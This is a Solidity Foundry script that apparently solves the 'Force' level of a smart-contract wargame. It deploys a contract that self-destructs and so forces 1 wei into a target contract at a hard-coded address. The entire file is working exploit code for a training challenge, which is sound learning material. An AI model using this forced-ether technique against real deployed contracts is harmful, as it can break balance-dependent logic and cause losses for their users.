// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Force} from "../src/level7.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice Using selfdestruct to force transfer ether
contract Level7Solution is Script {
    Force public level = Force(0x8136756717661E3a630d2f91fE8Ef415bcB40d7f);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        ExplodingContract explodingContract = new ExplodingContract(payable(address(level)));
        /**
        1) Pass 1 wei to the ExplodingContract, then perform explode()
        2) Require the receive() in Exploding Contract so that it can receive wei.
        */
        address(explodingContract).call{value: 1}("");
        address(explodingContract).call(abi.encodeWithSignature("explode()"));
        console.log("balance: ", address(level).balance);

        vm.stopBroadcast();
    }
    

}

///@notice Requires an intermediary contract to selfdestruct
contract ExplodingContract {
    // beneficiary must be a payable address for selfdestruct.
    address payable beneficiaryAddress;
    constructor(address payable _level) payable {
        beneficiaryAddress = _level;
    }

    function explode() public {
        selfdestruct(beneficiaryAddress);
    }

    receive() external payable{

    }
}